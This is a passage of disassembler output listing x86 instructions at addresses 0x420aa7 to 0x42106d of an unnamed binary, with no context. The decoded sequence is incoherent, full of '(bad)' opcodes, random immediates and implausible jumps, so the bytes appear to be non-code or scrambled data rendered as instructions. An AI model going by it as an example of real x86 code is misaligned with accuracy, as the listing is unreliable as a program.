  420aa7:	a9 b9 0d 2c a6       	test   $0xa62c0db9,%eax
  420aac:	f8                   	clc
  420aad:	be 71 98 64 4e       	mov    $0x4e649871,%esi
  420ab2:	21 69 c9             	and    %ebp,-0x37(%ecx)
  420ab5:	34 03                	xor    $0x3,%al
  420ab7:	43                   	inc    %ebx
  420ab8:	7c 60                	jl     0x420b1a
  420aba:	a8 a9                	test   $0xa9,%al
  420abc:	ad                   	lods   %ds:(%esi),%eax
  420abd:	b9 d7 94 ca 43       	mov    $0x43ca94d7,%ecx
  420ac2:	b0 ce                	mov    $0xce,%al
  420ac4:	67 b5 28             	addr16 mov $0x28,%ch
  420ac7:	bd 45 2f 8d 69       	mov    $0x698d2f45,%ebp
  420acc:	54                   	push   %esp
  420acd:	1e                   	push   %ds
  420ace:	cd 58                	int    $0x58
  420ad0:	c0 96 40 57 e6 ae 5d 	rclb   $0x5d,-0x5119a8c0(%esi)
  420ad7:	29 7c 7d 75          	sub    %edi,0x75(%ebp,%edi,2)
  420adb:	16                   	push   %ss
  420adc:	de f8                	fdivrp %st,%st(0)
  420ade:	c2 9b 7c             	ret    $0x7c9b
  420ae1:	a9 81 16 6e 82       	test   $0x826e1681,%eax
  420ae6:	95                   	xchg   %eax,%ebp
  420ae7:	cd 4d                	int    $0x4d
  420ae9:	22 b9 79 b9 83 c6    	and    -0x397c4687(%ecx),%bh
  420aef:	e2 7a                	loop   0x420b6b
  420af1:	49                   	dec    %ecx
  420af2:	b8 6f 4a 76 c3       	mov    $0xc3764a6f,%eax
  420af7:	f9                   	stc
  420af8:	ce                   	into
  420af9:	09 25 15 df c6 47    	or     %esp,0x47c6df15
  420aff:	c5 e0 51             	(bad)
  420b02:	c2 d8 2d             	ret    $0x2dd8
  420b05:	6e                   	outsb  %ds:(%esi),(%dx)
  420b06:	98                   	cwtl
  420b07:	68 8c ed 30 28       	push   $0x2830ed8c
  420b0c:	4f                   	dec    %edi
  420b0d:	c4 ab d6 42 55 21    	les    0x215542d6(%ebx),%ebp
  420b13:	89 6e eb             	mov    %ebp,-0x15(%esi)
  420b16:	5b                   	pop    %ebx
  420b17:	31 fd                	xor    %edi,%ebp
  420b19:	39 af d3 d8 e4 9a    	cmp    %ebp,-0x651b272d(%edi)
  420b1f:	65 10 f4             	gs adc %dh,%ah
  420b22:	dc 6e ea             	fsubrl -0x16(%esi)
  420b25:	00 b7 6d 84 2b 3c    	add    %dh,0x3c2b846d(%edi)
  420b2b:	e8 d6 6c 17 70       	call   0x70597806
  420b30:	9a 05 55 5c da 79 12 	lcall  $0x1279,$0xda5c5505
  420b37:	ca 3c 77             	lret   $0x773c
  420b3a:	c4 6e ba             	les    -0x46(%esi),%ebp
  420b3d:	a9 26 05 ed 48       	test   $0x48ed0526,%eax
  420b42:	48                   	dec    %eax
  420b43:	fd                   	std
  420b44:	c1 0b 6b             	rorl   $0x6b,(%ebx)
  420b47:	09 3a                	or     %edi,(%edx)
  420b49:	0d b9 dc 89 48       	or     $0x4889dcb9,%eax
  420b4e:	17                   	pop    %ss
  420b4f:	eb 1c                	jmp    0x420b6d
  420b51:	ab                   	stos   %eax,%es:(%edi)
  420b52:	32 f8                	xor    %al,%bh
  420b54:	c6                   	(bad)
  420b55:	aa                   	stos   %al,%es:(%edi)
  420b56:	93                   	xchg   %eax,%ebx
  420b57:	11 3f                	adc    %edi,(%edi)
  420b59:	76 75                	jbe    0x420bd0
  420b5b:	02 b3 ba c8 e7 ce    	add    -0x31183746(%ebx),%dh
  420b61:	f7 56 a6             	notl   -0x5a(%esi)
  420b64:	ca d7 2d             	lret   $0x2dd7
  420b67:	8c 8b 7e 89 f6 8b    	mov    %cs,-0x74097682(%ebx)
  420b6d:	16                   	push   %ss
  420b6e:	df 0e                	fisttps (%esi)
  420b70:	b2 1f                	mov    $0x1f,%dl
  420b72:	fc                   	cld
  420b73:	d1 67 e4             	shll   $1,-0x1c(%edi)
  420b76:	12 c1                	adc    %cl,%al
  420b78:	9c                   	pushf
  420b79:	29 66 5b             	sub    %esp,0x5b(%esi)
  420b7c:	02 a1 67 82 08 bf    	add    -0x40f77d99(%ecx),%ah
  420b82:	42                   	inc    %edx
  420b83:	cc                   	int3
  420b84:	52                   	push   %edx
  420b85:	ec                   	in     (%dx),%al
  420b86:	b9 c8 c6 f5 75       	mov    $0x75f5c6c8,%ecx
  420b8b:	ee                   	out    %al,(%dx)
  420b8c:	56                   	push   %esi
  420b8d:	82 4f 95 27          	orb    $0x27,-0x6b(%edi)
  420b91:	4a                   	dec    %edx
  420b92:	b8 b5 6b 37 b3       	mov    $0xb3376bb5,%eax
  420b97:	d8 f2                	fdiv   %st(2),%st
  420b99:	91                   	xchg   %eax,%ecx
  420b9a:	1a c4                	sbb    %ah,%al
  420b9c:	b3 9a                	mov    $0x9a,%bl
  420b9e:	67 ea d5 57 84 c3 4f 	addr16 ljmp $0x184f,$0xc38457d5
  420ba5:	18 
  420ba6:	ab                   	stos   %eax,%es:(%edi)
  420ba7:	29 13                	sub    %edx,(%ebx)
  420ba9:	39 dc                	cmp    %ebx,%esp
  420bab:	29 96 62 74 d9 72    	sub    %edx,0x72d97462(%esi)
  420bb1:	8a e1                	mov    %cl,%ah
  420bb3:	de 12                	ficoms (%edx)
  420bb5:	64 c3                	fs ret
  420bb7:	ac                   	lods   %ds:(%esi),%al
  420bb8:	be 6e 71 99 9a       	mov    $0x9a99716e,%esi
  420bbd:	c9                   	leave
  420bbe:	c4 22                	les    (%edx),%esp
  420bc0:	d9 76 fe             	fnstenv -0x2(%esi)
  420bc3:	16                   	push   %ss
  420bc4:	65 64 ca e0 40       	gs fs lret $0x40e0
  420bc9:	b1 4d                	mov    $0x4d,%cl
  420bcb:	3d e5 83 ce 82       	cmp    $0x82ce83e5,%eax
  420bd0:	c2 bd a0             	ret    $0xa0bd
  420bd3:	ac                   	lods   %ds:(%esi),%al
  420bd4:	1a 1b                	sbb    (%ebx),%bl
  420bd6:	12 e0                	adc    %al,%ah
  420bd8:	79 84                	jns    0x420b5e
  420bda:	d0 e1                	shl    $1,%cl
  420bdc:	b2 1e                	mov    $0x1e,%dl
  420bde:	bf 89 32 fa 48       	mov    $0x48fa3289,%edi
  420be3:	62 e1 42             	(bad) {%k5}{z}
  420be6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  420be7:	70 d5                	jo     0x420bbe
  420be9:	27                   	daa
  420bea:	b8 d8 81 34 c3       	mov    $0xc33481d8,%eax
  420bef:	3c 48                	cmp    $0x48,%al
  420bf1:	66 de 1f             	data16 ficomps (%edi)
  420bf4:	83 e1 4a             	and    $0x4a,%ecx
  420bf7:	c0 e9 3c             	shr    $0x3c,%cl
  420bfa:	ff 28                	ljmp   *(%eax)
  420bfc:	85 bc 0a 9a 81 95 09 	test   %edi,0x995819a(%edx,%ecx,1)
  420c03:	9e                   	sahf
  420c04:	42                   	inc    %edx
  420c05:	84 eb                	test   %ch,%bl
  420c07:	12 94 14 a0 19 03 f9 	adc    -0x6fce660(%esp,%edx,1),%dl
  420c0e:	1d 0f 88 ae 54       	sbb    $0x54ae880f,%eax
  420c13:	7e 04                	jle    0x420c19
  420c15:	f9                   	stc
  420c16:	60                   	pusha
  420c17:	7d ac                	jge    0x420bc5
  420c19:	8e a0 64 2f ad 9c    	mov    -0x6352d09c(%eax),%fs
  420c1f:	34 1d                	xor    $0x1d,%al
  420c21:	60                   	pusha
  420c22:	88 f3                	mov    %dh,%bl
  420c24:	09 db                	or     %ebx,%ebx
  420c26:	1f                   	pop    %ds
  420c27:	28 ff                	sub    %bh,%bh
  420c29:	43                   	inc    %ebx
  420c2a:	77 d1                	ja     0x420bfd
  420c2c:	ca 00 e3             	lret   $0xe300
  420c2f:	2d 09 de 54 3d       	sub    $0x3d54de09,%eax
  420c34:	4b                   	dec    %ebx
  420c35:	a3 19 5d cb 40       	mov    %eax,0x40cb5d19
  420c3a:	f0 53                	lock push %ebx
  420c3c:	05 f4 43 c1 c8       	add    $0xc8c143f4,%eax
  420c41:	0e                   	push   %cs
  420c42:	d5 35                	aad    $0x35
  420c44:	72 89                	jb     0x420bcf
  420c46:	fa                   	cli
  420c47:	17                   	pop    %ss
  420c48:	0c 35                	or     $0x35,%al
  420c4a:	f9                   	stc
  420c4b:	9b                   	fwait
  420c4c:	74 03                	je     0x420c51
  420c4e:	ef                   	out    %eax,(%dx)
  420c4f:	74 0d                	je     0x420c5e
  420c51:	e2 eb                	loop   0x420c3e
  420c53:	4c                   	dec    %esp
  420c54:	9a 36 de 39 49 be c6 	lcall  $0xc6be,$0x4939de36
  420c5b:	02 95 8f 37 01 f1    	add    -0xefec871(%ebp),%dl
  420c61:	a0 52 41 96 ad       	mov    0xad964152,%al
  420c66:	5b                   	pop    %ebx
  420c67:	83 d4 ba             	adc    $0xffffffba,%esp
  420c6a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  420c6b:	6e                   	outsb  %ds:(%esi),(%dx)
  420c6c:	f2 5e                	repnz pop %esi
  420c6e:	16                   	push   %ss
  420c6f:	7e ed                	jle    0x420c5e
  420c71:	b8 1a 14 ff 6e       	mov    $0x6eff141a,%eax
  420c76:	62 01                	bound  %eax,(%ecx)
  420c78:	a2 da 00 c7 9f       	mov    %al,0x9fc700da
  420c7d:	db e4                	fnsetpm(287 only)
  420c7f:	8d                   	lea    (bad),%ecx
  420c80:	cb                   	lret
  420c81:	99                   	cltd
  420c82:	22 79 50             	and    0x50(%ecx),%bh
  420c85:	38 eb                	cmp    %ch,%bl
  420c87:	e1 25                	loope  0x420cae
  420c89:	ec                   	in     (%dx),%al
  420c8a:	9c                   	pushf
  420c8b:	3e 03 05 c2 67 2e 12 	add    %ds:0x122e67c2,%eax
  420c92:	76 11                	jbe    0x420ca5
  420c94:	8f 44 53 a5          	pop    -0x5b(%ebx,%edx,2)
  420c98:	e3 9f                	jecxz  0x420c39
  420c9a:	2d 0f 51 79 ae       	sub    $0xae79510f,%eax
  420c9f:	bd a4 b2 dc 3c       	mov    $0x3cdcb2a4,%ebp
  420ca4:	42                   	inc    %edx
  420ca5:	c0 ae ed 84 24 5d e7 	shrb   $0xe7,0x5d2484ed(%esi)
  420cac:	b7 ec                	mov    $0xec,%bh
  420cae:	99                   	cltd
  420caf:	ac                   	lods   %ds:(%esi),%al
  420cb0:	09 de                	or     %ebx,%esi
  420cb2:	43                   	inc    %ebx
  420cb3:	b1 9a                	mov    $0x9a,%cl
  420cb5:	72 97                	jb     0x420c4e
  420cb7:	a9 5d 79 99 40       	test   $0x4099795d,%eax
  420cbc:	f6 63 97             	mulb   -0x69(%ebx)
  420cbf:	ea e6 d9 45 f2 c7 df 	ljmp   $0xdfc7,$0xf245d9e6
  420cc6:	4e                   	dec    %esi
  420cc7:	c0 5a eb 19          	rcrb   $0x19,-0x15(%edx)
  420ccb:	27                   	daa
  420ccc:	90                   	nop
  420ccd:	e2 47                	loop   0x420d16
  420ccf:	86 4e 88             	xchg   %cl,-0x78(%esi)
  420cd2:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  420cd4:	d0 ad 01 03 89 7d    	shrb   $1,0x7d890301(%ebp)
  420cda:	f0 09 8c ca d7 be 85 	lock or %ecx,-0xf7a4129(%edx,%ecx,8)
  420ce1:	f0 
  420ce2:	11 3e                	adc    %edi,(%esi)
  420ce4:	6f                   	outsl  %ds:(%esi),(%dx)
  420ce5:	ae                   	scas   %es:(%edi),%al
  420ce6:	bb 3f 57 e6 fa       	mov    $0xfae6573f,%ebx
  420ceb:	73 43                	jae    0x420d30
  420ced:	88 9e 15 ec 45 d9    	mov    %bl,-0x26ba13eb(%esi)
  420cf3:	b2 23                	mov    $0x23,%dl
  420cf5:	41                   	inc    %ecx
  420cf6:	cd 0e                	int    $0xe
  420cf8:	77 77                	ja     0x420d71
  420cfa:	9e                   	sahf
  420cfb:	e8 61 d0 84 d7       	call   0xd7c6dd61
  420d00:	6b 2b 70             	imul   $0x70,(%ebx),%ebp
  420d03:	9f                   	lahf
  420d04:	d1 be 04 6e 64 aa    	sarl   $1,-0x559b91fc(%esi)
  420d0a:	f8                   	clc
  420d0b:	f5                   	cmc
  420d0c:	dd 24 5d ae f6 0a d4 	frstor -0x2bf50952(,%ebx,2)
  420d13:	1f                   	pop    %ds
  420d14:	9b                   	fwait
  420d15:	ed                   	in     (%dx),%eax
  420d16:	c3                   	ret
  420d17:	2a 59 4b             	sub    0x4b(%ecx),%bl
  420d1a:	35 c3 9f df 13       	xor    $0x13df9fc3,%eax
  420d1f:	08 f1                	or     %dh,%cl
  420d21:	87 18                	xchg   %ebx,(%eax)
  420d23:	b0 4d                	mov    $0x4d,%al
  420d25:	8b b8 3a 61 cc ec    	mov    -0x13339ec6(%eax),%edi
  420d2b:	c2 6b 6e             	ret    $0x6e6b
  420d2e:	fd                   	std
  420d2f:	7e 88                	jle    0x420cb9
  420d31:	d8 dc                	fcomp  %st(4)
  420d33:	27                   	daa
  420d34:	6b 7f c3 99          	imul   $0xffffff99,-0x3d(%edi),%edi
  420d38:	c3                   	ret
  420d39:	85 05 65 2c d4 a6    	test   %eax,0xa6d42c65
  420d3f:	e1 10                	loope  0x420d51
  420d41:	fb                   	sti
  420d42:	f6 27                	mulb   (%edi)
  420d44:	fb                   	sti
  420d45:	e1 f0                	loope  0x420d37
  420d47:	0f cf                	bswap  %edi
  420d49:	18 95 73 81 b5 c3    	sbb    %dl,-0x3c4a7e8d(%ebp)
  420d4f:	b3 e5                	mov    $0xe5,%bl
  420d51:	94                   	xchg   %eax,%esp
  420d52:	43                   	inc    %ebx
  420d53:	d0 f8                	sar    $1,%al
  420d55:	9e                   	sahf
  420d56:	fc                   	cld
  420d57:	c2 75 5d             	ret    $0x5d75
  420d5a:	e2 44                	loop   0x420da0
  420d5c:	2b 80 d8 05 6b e5    	sub    -0x1a94fa28(%eax),%eax
  420d62:	b3 0e                	mov    $0xe,%bl
  420d64:	45                   	inc    %ebp
  420d65:	b4 19                	mov    $0x19,%ah
  420d67:	36 ba b9 7f bd 81    	ss mov $0x81bd7fb9,%edx
  420d6d:	61                   	popa
  420d6e:	3b 75 07             	cmp    0x7(%ebp),%esi
  420d71:	8c 49 86             	mov    %cs,-0x7a(%ecx)
  420d74:	67 1f                	addr16 pop %ds
  420d76:	d4 ff                	aam    $0xff
  420d78:	08 e5                	or     %ah,%ch
  420d7a:	d0 b6 ef 88 10 88    	shlb   $1,-0x77ef7711(%esi)
  420d80:	24 1b                	and    $0x1b,%al
  420d82:	e1 5b                	loope  0x420ddf
  420d84:	56                   	push   %esi
  420d85:	20 ec                	and    %ch,%ah
  420d87:	4b                   	dec    %ebx
  420d88:	40                   	inc    %eax
  420d89:	1e                   	push   %ds
  420d8a:	4e                   	dec    %esi
  420d8b:	2b ec                	sub    %esp,%ebp
  420d8d:	a3 6c 3e 89 ad       	mov    %eax,0xad893e6c
  420d92:	8a dc                	mov    %ah,%bl
  420d94:	b6 0c                	mov    $0xc,%dh
  420d96:	b6 b5                	mov    $0xb5,%dh
  420d98:	ef                   	out    %eax,(%dx)
  420d99:	e1 98                	loope  0x420d33
  420d9b:	8e 5e 38             	mov    0x38(%esi),%ds
  420d9e:	53                   	push   %ebx
  420d9f:	92                   	xchg   %eax,%edx
  420da0:	ea 41 b4 03 86 93 cf 	ljmp   $0xcf93,$0x8603b441
  420da7:	c7                   	(bad)
  420da8:	b5 bf                	mov    $0xbf,%ch
  420daa:	69 ad 88 0e 8f 88 9c 	imul   $0x9064fa9c,-0x7770f178(%ebp),%ebp
  420db1:	fa 64 90 
  420db4:	e3 bc                	jecxz  0x420d72
  420db6:	d2 ba 17 58 a1 77    	sarb   %cl,0x77a15817(%edx)
  420dbc:	7c 2a                	jl     0x420de8
  420dbe:	0c 7f                	or     $0x7f,%al
  420dc0:	6b 82 81 32 0d 38 9f 	imul   $0xffffff9f,0x380d3281(%edx),%eax
  420dc7:	16                   	push   %ss
  420dc8:	c8 49 70 ae          	enter  $0x7049,$0xae
  420dcc:	3f                   	aas
  420dcd:	6a c1                	push   $0xffffffc1
  420dcf:	b0 18                	mov    $0x18,%al
  420dd1:	b2 74                	mov    $0x74,%dl
  420dd3:	f4                   	hlt
  420dd4:	f8                   	clc
  420dd5:	85 66 20             	test   %esp,0x20(%esi)
  420dd8:	01 06                	add    %eax,(%esi)
  420dda:	40                   	inc    %eax
  420ddb:	06                   	push   %es
  420ddc:	55                   	push   %ebp
  420ddd:	96                   	xchg   %eax,%esi
  420dde:	23 6b d0             	and    -0x30(%ebx),%ebp
  420de1:	60                   	pusha
  420de2:	fc                   	cld
  420de3:	9b                   	fwait
  420de4:	8e d3                	mov    %ebx,%ss
  420de6:	bb b2 04 62 1f       	mov    $0x1f6204b2,%ebx
  420deb:	5f                   	pop    %edi
  420dec:	d7                   	xlat   %ds:(%ebx)
  420ded:	25 2a d4 a7 8a       	and    $0x8aa7d42a,%eax
  420df2:	e4 27                	in     $0x27,%al
  420df4:	c1 c9 81             	ror    $0x81,%ecx
  420df7:	0d c7 26 9d 5f       	or     $0x5f9d26c7,%eax
  420dfc:	21 4c 4f f9          	and    %ecx,-0x7(%edi,%ecx,2)
  420e00:	7d af                	jge    0x420db1
  420e02:	79 27                	jns    0x420e2b
  420e04:	fb                   	sti
  420e05:	83 d2 9c             	adc    $0xffffff9c,%edx
  420e08:	16                   	push   %ss
  420e09:	4a                   	dec    %edx
  420e0a:	52                   	push   %edx
  420e0b:	fa                   	cli
  420e0c:	c3                   	ret
  420e0d:	bd cf 8c 04 f4       	mov    $0xf4048ccf,%ebp
  420e12:	40                   	inc    %eax
  420e13:	d7                   	xlat   %ds:(%ebx)
  420e14:	33 e6                	xor    %esi,%esp
  420e16:	eb 7b                	jmp    0x420e93
  420e18:	f6 94 75 82 0d b8 c7 	notb   -0x3847f27e(%ebp,%esi,2)
  420e1f:	d7                   	xlat   %ds:(%ebx)
  420e20:	81 c5 43 ee 32 8c    	add    $0x8c32ee43,%ebp
  420e26:	aa                   	stos   %al,%es:(%edi)
  420e27:	f7 ce 3d ad c8 cd    	test   $0xcdc8ad3d,%esi
  420e2d:	d9 54 e0 80          	fsts   -0x80(%eax,%eiz,8)
  420e31:	95                   	xchg   %eax,%ebp
  420e32:	b1 f3                	mov    $0xf3,%cl
  420e34:	41                   	inc    %ecx
  420e35:	26 1f                	es pop %ds
  420e37:	ad                   	lods   %ds:(%esi),%eax
  420e38:	bc 90 aa a2 61       	mov    $0x61a2aa90,%esp
  420e3d:	de 86 89 7d 3b 67    	fiadds 0x673b7d89(%esi)
  420e43:	8f                   	(bad)
  420e44:	d3 82 57 32 49 70    	roll   %cl,0x70493257(%edx)
  420e4a:	96                   	xchg   %eax,%esi
  420e4b:	93                   	xchg   %eax,%ebx
  420e4c:	88 f8                	mov    %bh,%al
  420e4e:	ab                   	stos   %eax,%es:(%edi)
  420e4f:	ee                   	out    %al,(%dx)
  420e50:	95                   	xchg   %eax,%ebp
  420e51:	b9 61 32 fa dd       	mov    $0xddfa3261,%ecx
  420e56:	e7 d7                	out    %eax,$0xd7
  420e58:	6c                   	insb   (%dx),%es:(%edi)
  420e59:	cb                   	lret
  420e5a:	29 6b bf             	sub    %ebp,-0x41(%ebx)
  420e5d:	4d                   	dec    %ebp
  420e5e:	4b                   	dec    %ebx
  420e5f:	2a c0                	sub    %al,%al
  420e61:	6f                   	outsl  %ds:(%esi),(%dx)
  420e62:	e8 a5 26 df de       	call   0xdf21350c
  420e67:	22 e4                	and    %ah,%ah
  420e69:	35 68 4c e5 20       	xor    $0x20e54c68,%eax
  420e6e:	8a 50 a8             	mov    -0x58(%eax),%dl
  420e71:	72 4c                	jb     0x420ebf
  420e73:	f8                   	clc
  420e74:	a9 85 a2 b7 a4       	test   $0xa4b7a285,%eax
  420e79:	e3 e6                	jecxz  0x420e61
  420e7b:	6d                   	insl   (%dx),%es:(%edi)
  420e7c:	b9 d9 f2 94 21       	mov    $0x2194f2d9,%ecx
  420e81:	c5 b1 7a 71 b5 b8    	lds    -0x474a8e86(%ecx),%esi
  420e87:	7e f1                	jle    0x420e7a
  420e89:	36 dd 04 3d da 8c ee 	fldl   %ss:0x49ee8cda(,%edi,1)
  420e90:	49 
  420e91:	c8 c1 29 9a          	enter  $0x29c1,$0x9a
  420e95:	7c 0d                	jl     0x420ea4
  420e97:	ea 31 ba f0 97 19 f6 	ljmp   $0xf619,$0x97f0ba31
  420e9e:	a3 5f 64 c1 cc       	mov    %eax,0xccc1645f
  420ea3:	2c 26                	sub    $0x26,%al
  420ea5:	94                   	xchg   %eax,%esp
  420ea6:	48                   	dec    %eax
  420ea7:	42                   	inc    %edx
  420ea8:	b5 af                	mov    $0xaf,%ch
  420eaa:	20 7f e7             	and    %bh,-0x19(%edi)
  420ead:	74 8f                	je     0x420e3e
  420eaf:	bf 49 c7 43 3c       	mov    $0x3c43c749,%edi
  420eb4:	9e                   	sahf
  420eb5:	ba 53 26 f7 6f       	mov    $0x6ff72653,%edx
  420eba:	5d                   	pop    %ebp
  420ebb:	0f 7a                	(bad)
  420ebd:	40                   	inc    %eax
  420ebe:	97                   	xchg   %eax,%edi
  420ebf:	88 23                	mov    %ah,(%ebx)
  420ec1:	ec                   	in     (%dx),%al
  420ec2:	0f 81 47 79 8a 27    	jno    0x27cc880f
  420ec8:	c4 bd 6c b0 95 4f    	les    0x4f95b06c(%ebp),%edi
  420ece:	87 b8 78 88 e1 cc    	xchg   %edi,-0x331e7788(%eax)
  420ed4:	5b                   	pop    %ebx
  420ed5:	8c d3                	mov    %ss,%ebx
  420ed7:	92                   	xchg   %eax,%edx
  420ed8:	4f                   	dec    %edi
  420ed9:	4f                   	dec    %edi
  420eda:	24 ec                	and    $0xec,%al
  420edc:	06                   	push   %es
  420edd:	32 52 61             	xor    0x61(%edx),%dl
  420ee0:	b1 5e                	mov    $0x5e,%cl
  420ee2:	a9 c7 66 3f ed       	test   $0xed3f66c7,%eax
  420ee7:	65 65 00 a1 db b6 e7 	gs add %ah,%gs:-0x21184925(%ecx)
  420eee:	de 
  420eef:	af                   	scas   %es:(%edi),%eax
  420ef0:	49                   	dec    %ecx
  420ef1:	bc 32 ed ab cc       	mov    $0xccabed32,%esp
  420ef6:	67 10 19             	adc    %bl,(%bx,%di)
  420ef9:	11 5e 62             	adc    %ebx,0x62(%esi)
  420efc:	fb                   	sti
  420efd:	55                   	push   %ebp
  420efe:	d6                   	salc
  420eff:	40                   	inc    %eax
  420f00:	cb                   	lret
  420f01:	a0 74 65 80 aa       	mov    0xaa806574,%al
  420f06:	15 b5 6a b8 40       	adc    $0x40b86ab5,%eax
  420f0b:	03 91 ff 38 50 77    	add    0x775038ff(%ecx),%edx
  420f11:	b7 c0                	mov    $0xc0,%bh
  420f13:	18 72 63             	sbb    %dh,0x63(%edx)
  420f16:	0e                   	push   %cs
  420f17:	7f fd                	jg     0x420f16
  420f19:	e2 65                	loop   0x420f80
  420f1b:	1e                   	push   %ds
  420f1c:	9d                   	popf
  420f1d:	2f                   	das
  420f1e:	f2 df 10             	repnz fists (%eax)
  420f21:	1e                   	push   %ds
  420f22:	8d 21                	lea    (%ecx),%esp
  420f24:	e2 76                	loop   0x420f9c
  420f26:	9d                   	popf
  420f27:	df 2d 97 f8 ba 37    	fildll 0x37baf897
  420f2d:	0e                   	push   %cs
  420f2e:	0f d9 12             	psubusw (%edx),%mm2
  420f31:	b9 76 ac 41 22       	mov    $0x2241ac76,%ecx
  420f36:	75 75                	jne    0x420fad
  420f38:	72 e2                	jb     0x420f1c
  420f3a:	0e                   	push   %cs
  420f3b:	1c 0c                	sbb    $0xc,%al
  420f3d:	d3 7a 34             	sarl   %cl,0x34(%edx)
  420f40:	da 74 71 f7          	fidivl -0x9(%ecx,%esi,2)
  420f44:	93                   	xchg   %eax,%ebx
  420f45:	8b 89 fa 25 f8 56    	mov    0x56f825fa(%ecx),%ecx
  420f4b:	b0 2c                	mov    $0x2c,%al
  420f4d:	11 af f5 ce f7 39    	adc    %ebp,0x39f7cef5(%edi)
  420f53:	40                   	inc    %eax
  420f54:	b8 2f ee b0 ad       	mov    $0xadb0ee2f,%eax
  420f59:	d2 15 84 ad e5 06    	rclb   %cl,0x6e5ad84
  420f5f:	40                   	inc    %eax
  420f60:	3c 0f                	cmp    $0xf,%al
  420f62:	79 5c                	jns    0x420fc0
  420f64:	73 2a                	jae    0x420f90
  420f66:	44                   	inc    %esp
  420f67:	bd 61 8a 06 8d       	mov    $0x8d068a61,%ebp
  420f6c:	ed                   	in     (%dx),%eax
  420f6d:	64 4c                	fs dec %esp
  420f6f:	b1 07                	mov    $0x7,%cl
  420f71:	d7                   	xlat   %ds:(%ebx)
  420f72:	33 4e 69             	xor    0x69(%esi),%ecx
  420f75:	ce                   	into
  420f76:	3b 57 ca             	cmp    -0x36(%edi),%edx
  420f79:	5f                   	pop    %edi
  420f7a:	86 1e                	xchg   %bl,(%esi)
  420f7c:	b6 99                	mov    $0x99,%dh
  420f7e:	4d                   	dec    %ebp
  420f7f:	26 a9 60 57 e1 c3    	es test $0xc3e15760,%eax
  420f85:	96                   	xchg   %eax,%esi
  420f86:	c9                   	leave
  420f87:	53                   	push   %ebx
  420f88:	78 6d                	js     0x420ff7
  420f8a:	7c 9e                	jl     0x420f2a
  420f8c:	70 4d                	jo     0x420fdb
  420f8e:	7a 7c                	jp     0x42100c
  420f90:	d8 45 80             	fadds  -0x80(%ebp)
  420f93:	f0 84 ff             	lock test %bh,%bh
  420f96:	01 00                	add    %eax,(%eax)
  420f98:	6d                   	insl   (%dx),%es:(%edi)
  420f99:	20 3f                	and    %bh,(%edi)
  420f9b:	d8 8c f2 6a 3d bb 68 	fmuls  0x68bb3d6a(%edx,%esi,8)
  420fa2:	42                   	inc    %edx
  420fa3:	7d 41                	jge    0x420fe6
  420fa5:	a8 b1                	test   $0xb1,%al
  420fa7:	bd bd 26 a7 7c       	mov    $0x7ca726bd,%ebp
  420fac:	d2 9d 92 d4 f4 0d    	rcrb   %cl,0xdf4d492(%ebp)
  420fb2:	8b 2a                	mov    (%edx),%ebp
  420fb4:	2e 35 a7 f5 88 b3    	cs xor $0xb388f5a7,%eax
  420fba:	84 86 05 96 1c 14    	test   %al,0x141c9605(%esi)
  420fc0:	b8 e0 19 5d 03       	mov    $0x35d19e0,%eax
  420fc5:	d7                   	xlat   %ds:(%ebx)
  420fc6:	bb 27 b9 0a 3d       	mov    $0x3d0ab927,%ebx
  420fcb:	9b                   	fwait
  420fcc:	b8 b1 2d 5e 64       	mov    $0x645e2db1,%eax
  420fd1:	e5 c9                	in     $0xc9,%eax
  420fd3:	bd 3d ff 1b 1a       	mov    $0x1a1bff3d,%ebp
  420fd8:	5a                   	pop    %edx
  420fd9:	c6                   	(bad)
  420fda:	56                   	push   %esi
  420fdb:	1b ca                	sbb    %edx,%ecx
  420fdd:	48                   	dec    %eax
  420fde:	4a                   	dec    %edx
  420fdf:	4c                   	dec    %esp
  420fe0:	f5                   	cmc
  420fe1:	08 99 83 e7 d5 57    	or     %bl,0x57d5e783(%ecx)
  420fe7:	99                   	cltd
  420fe8:	93                   	xchg   %eax,%ebx
  420fe9:	61                   	popa
  420fea:	88 72 67             	mov    %dh,0x67(%edx)
  420fed:	00 a3 91 9e 48 5d    	add    %ah,0x5d489e91(%ebx)
  420ff3:	9d                   	popf
  420ff4:	af                   	scas   %es:(%edi),%eax
  420ff5:	00 8b ad ea 82 a0    	add    %cl,-0x5f7d1553(%ebx)
  420ffb:	b9 32 00 81 e7       	mov    $0xe7810032,%ecx
  421000:	3f                   	aas
  421001:	56                   	push   %esi
  421002:	8d 78 46             	lea    0x46(%eax),%edi
  421005:	52                   	push   %edx
  421006:	3f                   	aas
  421007:	69 0c 90 3b b9 93 de 	imul   $0xde93b93b,(%eax,%edx,4),%ecx
  42100e:	20 57 c8             	and    %dl,-0x38(%edi)
  421011:	fa                   	cli
  421012:	5b                   	pop    %ebx
  421013:	3a aa a2 83 de ed    	cmp    -0x12217c5e(%edx),%ch
  421019:	0e                   	push   %cs
  42101a:	98                   	cwtl
  42101b:	a2 12 8e e4 1e       	mov    %al,0x1ee48e12
  421020:	f6 02 ad             	testb  $0xad,(%edx)
  421023:	ad                   	lods   %ds:(%esi),%eax
  421024:	44                   	inc    %esp
  421025:	70 ab                	jo     0x420fd2
  421027:	8d 20                	lea    (%eax),%esp
  421029:	b1 40                	mov    $0x40,%cl
  42102b:	b1 88                	mov    $0x88,%cl
  42102d:	53                   	push   %ebx
  42102e:	3b cc                	cmp    %esp,%ecx
  421030:	2a ad 50 fb 75 59    	sub    0x5975fb50(%ebp),%ch
  421036:	bd d1 d5 8b b9       	mov    $0xb98bd5d1,%ebp
  42103b:	12 7e e1             	adc    -0x1f(%esi),%bh
  42103e:	9a f6 4a 8b 99 2f 55 	lcall  $0x552f,$0x998b4af6
  421045:	20 7e 46             	and    %bh,0x46(%esi)
  421048:	21 c1                	and    %eax,%ecx
  42104a:	91                   	xchg   %eax,%ecx
  42104b:	ed                   	in     (%dx),%eax
  42104c:	9c                   	pushf
  42104d:	0c cd                	or     $0xcd,%al
  42104f:	c6                   	(bad)
  421050:	5b                   	pop    %ebx
  421051:	ae                   	scas   %es:(%edi),%al
  421052:	63 0e                	arpl   %ecx,(%esi)
  421054:	7d a9                	jge    0x420fff
  421056:	c3                   	ret
  421057:	e9 bc 1e 44 50       	jmp    0x50862f18
  42105c:	3e fa                	ds cli
  42105e:	b7 42                	mov    $0x42,%bh
  421060:	cf                   	iret
  421061:	3b e7                	cmp    %edi,%esp
  421063:	22 4b b4             	and    -0x4c(%ebx),%cl
  421066:	fd                   	std
  421067:	f7 c9 4b f2 c0 fe    	test   $0xfec0f24b,%ecx
